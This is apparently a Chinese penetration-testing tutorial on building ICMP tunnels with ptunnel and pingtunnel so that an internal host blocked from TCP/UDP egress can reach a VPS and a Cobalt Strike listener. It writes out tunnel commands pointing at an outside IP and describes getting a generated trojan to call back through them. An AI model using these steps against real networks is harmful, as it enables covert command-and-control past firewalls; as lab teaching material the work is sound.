## **前言**

在渗透测试工作中，经常会碰到web入口机或内网主机无论使用TCP、UDP都无法使其上线c2服务端，且web入口主机被层层waf保护，reg、abtts、tunna等HTTP代理都无法使用的情况。如果目标主机可以ping通外网，不拦截icmp数据包，那此时可选择使用icmp协议隧道把目标内网流量转发出来，这里把学习搭建icmp隧道的过程记录一下。

## ICMP隧道

ICMP隧道简单实用，是一个比较特殊的协议。在一般的通信协议里，如果两台设备要进行通信，肯定需要开放端口，而在icmp协议下就不需要。最常见的ping命令就是利用icmp协议，在一些网络环境中，如果攻击者使用各类上层隧道进行的操作都失败了，常常会通过ping命令访问远程计算机，
这是因为icmp隧道将TCP/UDP数据封装到ICMP的ping数据中，从而穿过防火墙(防火墙一般不会屏蔽ping的数据包)，实现不受限制的访问。

## 使用场景

在渗透测试工作中，经常会碰到web入口机或内网主机无论使用TCP、UDP都无法使其上线c2服务端，而且web入口主机被层层waf保护，reg、abtts、tunna等HTTP代理都无法使用的情况。如果目标主机可以ping通外网，不拦截icmp数据包，那此时可选择使用icmp协议隧道把目标内网流量转发出来，防火墙一般也不会屏蔽ping的数据包。

## 靶场配置

  * kali靶机：模拟不出网主机，只有icmp协议才可访问互联网
  * vps： 用作ptunnel服务端，响应ping请求

ptunnel安装：

    
    
    #安装libpcap的依赖环境apt-get install byaccapt-get install flex bison#安装libpcap依赖库wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gztar -xzvf libpcap-1.9.0.tar.gzcd libpcap-1.9.0./configuremake && make install#安装PingTunnelwget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gztar -xzvf PingTunnel-0.72.tar.gzcd PingTunnelmake && make install

安装完libpcap依赖，运行ptunnel提示找不到libpcap：

  * 执行 locate libpcap.so.1，查看libpcap.so.1在系统中的路径
  * 随后以管理员权限打开编辑 /etc/ld.so.conf文件, 末尾追加libpcap的路径
  * 以管理员权限执行 ldconfig命令加载配置

![](https://image.3001.net/images/20220601/1654071743_629721bfe6ad16dc403c9.png!small)

![](https://image.3001.net/images/20220601/1654071765_629721d56128adc83e3ee.png!small)

针对内网机安装libpcap依赖容易出现问题，可copy libpcap.so文件至内网机，修改/etc/ld.so.conf文件加载配置。

这里配置防火墙，模拟ICMP出网的场景：

    
    
    # 允许icmp协议访问42/8段iptables -A INPUT -s 42.0.0.0/8 -p icmp  -j ACCEPT# 禁止TCP协议访问119/8段iptables -A INPUT -s 42.0.0.0/8 -p tcp  -j DROP# 清除预设表filter中的所有规则链的规则iptables -F# 清除预设表filter中使用者自定链中的规则 iptables -X# 查看iptables的配置信息iptables -L -n

![](https://image.3001.net/images/20220601/1654071814_629722065925599a43fd8.png!small)

icmp可出网，tcp不出网：

![](https://image.3001.net/images/20220601/1654073708_6297296c3a191726f02df.png!small)

## 利用过程

vps运行ptunnel，作为ptunnel的服务端。

![](https://image.3001.net/images/20220601/1654074015_62972a9fb32593c740540.png!small)

内网机执行ptunnel，作为ptunnel的客户端。

    
    
    -p 指定跳板机的IP-lp 指定转发本地监听的端口 -da 指定最终要访问的目标主机 -dp 指定最终要访问目标主机的端口

将内网机的2222端口通过ptunnel，重定向至vps的22号端口：

![](https://image.3001.net/images/20220601/1654071878_62972246d81d8971c8b30.png!small)

随后内网机的2222号端口就是vps上的22号端口：

![](https://image.3001.net/images/20220601/1654071894_62972256ee3679d4f7662.png!small)

通过ssh建立socks代理访问互联网。

在内网机上利用ssh的动态转发功能，ssh监听9000端口开启socks代理，并把流量重定向至vps：

![](https://image.3001.net/images/20220601/1654071941_629722853716e827ff92a.png!small)

随后内网机配置socks代理，就能访问互联网资源。内网机流量通过vps访问互联网：

![](https://image.3001.net/images/20220601/1654071981_629722ad145e51f337cfd.png!small)

浏览器使用插件配置socks5代理：

![](https://image.3001.net/images/20220601/1654072113_62972331e1748244c432b.png!small)ptunnel缺点：

  * libpcap依赖安装较为麻烦
  * 目标主机程序需要通过socks代理才能出网

## 利用pingtunnel建立icmp隧道

    
    
    服务端参数./pingtunnel -type server客户端参数#本地监听1081端口开启socks代理，并把流量重定向到vps，此时内网机器的流量通过vps出去./pingtunnel -type client -l :1081 -s vps服务端地址 -sock5 1#转发tcp#本地监听1081端口，并把该端口通过服务端重定向至vps的80端口./pingtunnel -type client -l :1081 -s vps服务端地址 -t vps:80 -tcp 1#转发udp./pingtunnel -type client -l :1081 -s www.yourserver.com -t www.yourserver.com:1081

vps运行pingtunnel，作为icmp的做服务端：![](https://image.3001.net/images/20220601/1654072149_629723555b8f5e9e4f22d.png!small)

内网主机开启socks代理，并把流量转发到vps,此时socks的流量通过vps出去。![](https://image.3001.net/images/20220601/1654072194_62972382424c306049456.png!small)

配置代理即可：

![](https://image.3001.net/images/20220601/1654072273_629723d18dcc41941a38b.png!small)

## CS上线

CS建立监听127.0.0.1:6666和vps:7777：

![](https://image.3001.net/images/20220601/1654072367_6297242f95bbbb65a0498.png!small)

使用listener 2的监听生成木马：

    
    
    vps服务端执行操作./pingtunnel -type server在靶机执行操作：pingtunnel.exe -type client -l 127.0.0.1:6666 -s 42.192.170.47 -t 42.192.170.47:7777 -tcp 1

![](https://image.3001.net/images/20220601/1654072451_629724835dab6ea52b5bf.png!small)

运行木马，CS监听上线：![](https://image.3001.net/images/20220601/1654072500_629724b42c94fd9c96fb2.png!small)

## 总结

通过本次对icmp隧道穿透的讲解，我们掌握了如何在目标服务器不出网的情况下上线c2服务端的方法，后续我们将继续学习通过dns来搭建隧道的方法。

  

